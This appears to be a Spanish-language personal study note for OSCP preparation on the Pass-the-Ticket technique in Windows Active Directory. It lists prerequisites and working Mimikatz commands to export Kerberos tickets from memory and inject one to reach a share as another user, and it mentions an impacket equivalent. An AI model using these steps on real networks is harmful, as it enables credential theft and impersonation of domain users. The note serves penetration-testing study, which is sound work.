---
tipo: tecnica
fase: post-explotacion
so: windows
tags: [oscp, tecnica, ad, post-explotacion, windows]
---

# Pass-the-Ticket

> [!abstract] Qué es y cuándo usarla
> Exportar tickets Kerberos (**TGT/TGS**) de la memoria e **inyectarlos** en otra sesión para suplantar a su dueño y acceder a recursos que nuestro usuario no puede. Útil cuando en la máquina hay sesión de un usuario con más acceso que el nuestro.

## Requisitos previos
- **Admin local** para exportar tickets de *otros* usuarios (`sekurlsa::tickets /export`). Inyectar los **propios** no requiere admin.
- Una sesión de otro usuario con el ticket/acceso que te interesa.

## Pasos
```text
# Mimikatz: volcar todos los TGT/TGS a disco en formato .kirbi
privilege::debug
sekurlsa::tickets /export
```
```powershell
dir *.kirbi        # elegir el TGS que da el acceso (p.ej. dave@cifs-web04.kirbi)
```
```text
# inyectar el ticket en la sesion actual
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
```powershell
klist                 # confirmar el ticket importado
ls \\web04\backup     # acceso como el dueño del ticket (dave)
```

> [!tip] **TGT** = reutilizable (~10h, no atado a host) → pide nuevos TGS. **TGS** = solo para su SPN concreto. Inyectar tickets **propios** no necesita privilegios.

> [!warning] Detección / problemas
> - Exportar tickets ajenos requiere admin local (LSASS).
> - Desde Kali: impacket con `-k` + `KRB5CCNAME` (ccache) hace lo equivalente.
> - Relacionado: [[Overpass-the-Hash]], [[Silver Ticket]], [[Golden Ticket]].

## Visto en
- Módulo: [[24 - Lateral Movement in Active Directory]]
- Máquinas: [[]]
